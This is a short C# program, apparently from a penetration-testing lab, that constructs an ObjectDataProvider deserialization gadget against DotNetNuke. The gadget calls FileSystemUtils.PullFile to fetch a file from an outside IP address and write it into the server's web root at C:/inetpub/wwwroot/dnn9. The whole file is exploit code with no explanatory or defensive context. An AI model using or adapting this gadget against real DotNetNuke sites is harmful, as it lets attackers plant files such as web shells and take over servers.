using System; 
using System.IO; 
using System.Xml.Serialization; 
using DotNetNuke.Common.Utilities; 
using System.Windows.Data;

namespace ODPSerializer 
{ 
    class Program 
    { 
        static void Main(string[] args) 
        { 
            ObjectDataProvider myODP = new ObjectDataProvider();
            myODP.ObjectInstance = new FileSystemUtils();
            myODP.MethodName = "PullFile";
            myODP.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");

            myODP.MethodParameters.Add("C:/inetpub/wwwroot/dnn9/PullFileTest.txt");
            Console.WriteLine("Done!"); 
        } 
    } 
} 
